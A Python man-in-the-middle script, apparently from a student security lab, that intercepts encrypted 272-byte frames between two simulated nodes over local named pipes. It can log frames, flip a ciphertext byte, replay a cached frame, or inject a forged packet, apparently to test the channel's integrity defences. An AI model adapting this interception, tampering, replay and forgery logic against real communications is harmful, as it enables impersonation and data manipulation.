#!/usr/bin/env python3

import os
import sys
import time
import argparse
import binascii

try:
    import packet_utils as pu
    HAS_PACKET_UTILS = True
except ImportError:
    HAS_PACKET_UTILS = False
    import struct

PIPE_IN = "/tmp/nodeA_to_attacker"
PIPE_OUT = "/tmp/attacker_to_nodeB"

PACKET_SIZE = pu.PACKET_SIZE if HAS_PACKET_UTILS else 272


class MitmOrchestrator:
    def __init__(self, mode, target_str=None, replace_str=None, inject_msg=None):
        self.mode = mode
        self.target_str = target_str
        self.replace_str = replace_str
        self.inject_msg = inject_msg
        self.replay_cache = []  

    def compute_crc32(self, data_bytes):
        """Computes unsigned 32-bit CRC checksum for telemetry logging."""
        return binascii.crc32(data_bytes) & 0xFFFFFFFF

    def run(self):
        """Launches the primary pipeline intercept engine."""
        if self.mode == "inject":
            self.execute_standalone_injection()
            return

        print(f"[*] Initializing Active Intercept Layer. Strategy: [{self.mode.upper()}]")
        
        if not os.path.exists(PIPE_IN) or not os.path.exists(PIPE_OUT):
            print("[-] Infrastructure Error: Named pipes missing.")
            sys.exit(1)

        print("[*] Opening Channel Read Target (Listening to Node A)...")
        fd_in = os.open(PIPE_IN, os.O_RDONLY)
        
        print("[*] Opening Channel Write Target (Forwarding to Node B)...")
        fd_out = os.open(PIPE_OUT, os.O_WRONLY)
        
        print("[+] Proxy routing channels engaged seamlessly.\n")

        while True:
            try:
                # Clean byte extraction matching 272-byte boundary
                raw_packet = os.read(fd_in, PACKET_SIZE)
                if not raw_packet:
                    print("[*] Stream terminated by Sender. Awaiting reconnection context...")
                    os.close(fd_in)
                    fd_in = os.open(PIPE_IN, os.O_RDONLY)
                    continue

                if len(raw_packet) < PACKET_SIZE:
                    print(f"[-] Received incomplete frame ({len(raw_packet)}/{PACKET_SIZE} bytes). Skipping...")
                    continue

                if HAS_PACKET_UTILS:
                    try:
                        pkt = pu.deserialize_packet(raw_packet)
                        seq = pkt.seq
                        src_id = pkt.src_id
                        dest_id = pkt.dest_id
                        pkt_type = pkt.type
                        payload_data = pkt.payload
                        payload_len = pkt.length
                        magic = pkt.header
                        nonce_hex = binascii.hexlify(pkt.nonce).decode('utf-8')
                        tag_hex = binascii.hexlify(pkt.tag).decode('utf-8')
                    except Exception as e:
                        print(f"[-] Frame parsing warning: {e}")
                        seq, src_id, dest_id, pkt_type, payload_len = 0, 1, 2, 1, 0
                        payload_data = raw_packet
                        magic = 0
                        nonce_hex, tag_hex = "N/A", "N/A"
                else:
                    seq, src_id, dest_id, pkt_type, payload_len = 0, 1, 2, 1, len(raw_packet)
                    payload_data = raw_packet
                    magic = 0
                    nonce_hex, tag_hex = "N/A", "N/A"

                crc = self.compute_crc32(raw_packet)

                print("\033[94m" + "="*60)
                print(f"[INTERCEPTED FRAME] Sequence Index: {seq}")
                print(f"  ├── Magic Identifier : {hex(magic).upper()}")
                print(f"  ├── Source Node ID   : {src_id}")
                print(f"  ├── Destination ID   : {dest_id}")
                print(f"  ├── Packet Type Tag  : {pkt_type}")
                print(f"  ├── Ciphertext Hex   : {binascii.hexlify(payload_data[:24]).decode('utf-8')}... ({payload_len} Bytes Payload)")
                if HAS_PACKET_UTILS:
                    print(f"  ├── AES Nonce (12B)  : {nonce_hex}")
                    print(f"  ├── GCM Tag (16B)    : {tag_hex}")
                print(f"  └── Computed Telemetry CRC32 : {hex(crc).upper()}")
                print("="*60 + "\033[0m")

                if self.mode == "replay":
                    self.replay_cache.append(raw_packet)
                    print(f"[+] Replay Subsystem: Cached valid 272-byte encrypted frame.")

                if self.mode == "tamper":
                    print(f"\n\033[91m[!] TAMPER MODE: Modifying ciphertext bytes to attack integrity...")
                    byte_arr = bytearray(raw_packet)
                    byte_arr[100] ^= 0xFF 
                    raw_packet = bytes(byte_arr)
                    print(f"  ├── Mutator: Modified byte offset 100 in ciphertext block.")
                    print(f"  └── Structure Pack: Forwarding corrupted 272-byte frame to Node B.\033[0m\n")

                os.write(fd_out, raw_packet)

                if self.mode == "replay" and len(self.replay_cache) > 0:
                    time.sleep(2) 
                    print("\n\033[33m[!] REPLAY ATTACK EXECUTION: Re-injecting historical state frame...")
                    try:
                        os.write(fd_out, self.replay_cache[0])
                        print("    └── [SUCCESS] Duplicate sequence packet pushed to Node B.\033[0m\n")
                    except BrokenPipeError:
                        print("    └── [❌ FAILURE] Broken Pipe! Node B exited early or didn't run in a loop.\033[0m\n")
                    self.replay_cache.clear()

            except KeyboardInterrupt:
                print("\n[*] Intercept routine terminated cleanly.")
                break
            except Exception as e:
                print(f"[-] Runtime processing error encountered: {e}")
                break

        os.close(fd_in)
        os.close(fd_out)

    def execute_standalone_injection(self):
        """FORGED PACKET INJECTION"""
        print(f"[*] Initializing Forged Packet Injection Engine...")
        print(f"[*] Bypassing Node A entirely. Establishing target channel access link...")
        
        try:
            fd_out = os.open(PIPE_OUT, os.O_WRONLY)
            
            if HAS_PACKET_UTILS:
                pkt = pu.Packet()
                pkt.src_id = 1
                pkt.dest_id = 2
                pkt.type = 1
                pkt.seq = 1337
                pkt.timestamp = int(time.time())
                pkt.salt = b'\x00' * 16
                pkt.nonce = b'\x00' * 12
                pkt.tag = b'\x00' * 16
                fake_payload = self.inject_msg.encode('utf-8', errors='ignore')
                pkt.length = len(fake_payload)
                pkt.payload = fake_payload.ljust(256, b'\x00')
                packet = pu.serialize_packet(pkt)
            else:
                packet = b'\x00' * 272

            print("\n\033[95m" + "!"*60)
            print(f"[PACKET FORGERY DISPATCHED] Sending Unauthorized Structural Payload")
            print(f"  ├── Forged Message Body : \"{self.inject_msg}\"")
            print(f"  └── Total Outflow Frame : {len(packet)} Bytes Packed")
            print("!"*60 + "\033[0m\n")
            
            os.write(fd_out, packet)
            os.close(fd_out)
            
        except Exception as e:
            print(f"[-] Critical injection processing crash occurred: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IITI SOC 2026 Track 3 Cyber Engine")
    parser.add_argument('--mode', choices=['sniff', 'tamper', 'replay', 'inject'], required=True)
    parser.add_argument('--target', type=str, help="Target keyword to match during tampering loops.")
    parser.add_argument('--replace', type=str, help="Replacement text to write over target entries.")
    parser.add_argument('--message', type=str, default="HELLO FROM NODE A", help="Data block payload for injection runs.")
    
    args = parser.parse_args()
    engine = MitmOrchestrator(mode=args.mode, target_str=args.target, replace_str=args.replace, inject_msg=args.message)
    engine.run()
